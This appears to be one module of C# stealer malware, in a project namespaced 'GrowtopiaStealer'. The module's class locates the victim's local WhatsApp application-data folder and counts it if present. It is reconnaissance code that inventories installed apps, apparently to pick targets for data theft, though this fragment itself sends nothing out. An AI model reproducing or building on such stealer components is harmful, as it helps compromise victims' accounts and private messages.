using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace GrowtopiaStealer
{
    class WhatsApp
    {
        #region WhatsApp Paths
        public static string dirPathh = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\WhatsApp";
        #endregion

        #region Exists or No
        public static void WhatsAppsExistOrNo()
        {
            DirectoryInfo visualstudio = new DirectoryInfo(Path.Combine(dirPathh));
            // Stop if not exists
            if (!visualstudio.Exists)
                return;
            Counting.WhatsApp++;
        }
        #endregion
    }
}
